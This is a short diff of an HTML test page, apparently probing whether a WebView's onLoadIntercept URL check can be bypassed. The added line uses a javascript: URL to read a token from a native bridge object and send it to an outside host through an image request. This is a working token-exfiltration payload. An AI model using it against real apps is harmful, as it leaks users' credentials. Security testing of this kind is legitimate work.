@@ -11,6 +11,7 @@
 	<p>绕过onLoadIntercept中的url检测</p></br>
 	<script>
 		window.location.href="javascript:console.info('wzztest:token is: ' + testObjName.getToken())"
+		window.location.href="javascript:const myImage = document.createElement('img');myImage.setAttribute('src','http://www.baidu.com/?data='+testObjName.getToken());document.body.appendChild(myImage);"
 	</script>
   </body>
 </html>
